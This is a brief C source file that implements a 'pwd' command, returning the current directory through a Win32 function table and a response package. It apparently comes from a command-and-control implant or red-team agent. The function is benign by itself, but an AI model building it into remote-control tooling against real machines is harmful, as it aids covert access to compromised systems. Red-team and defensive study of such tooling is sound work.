#include "config.h"
#ifdef INCLUDE_CMD_PWD

#include "commands.h"

VOID cmd_pwd(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    char cwd[MAX_PATH] = {0};
    inst->Win32.GetCurrentDirectoryA(MAX_PATH, cwd);
    package_add_string(inst, response, cwd);
}

#endif
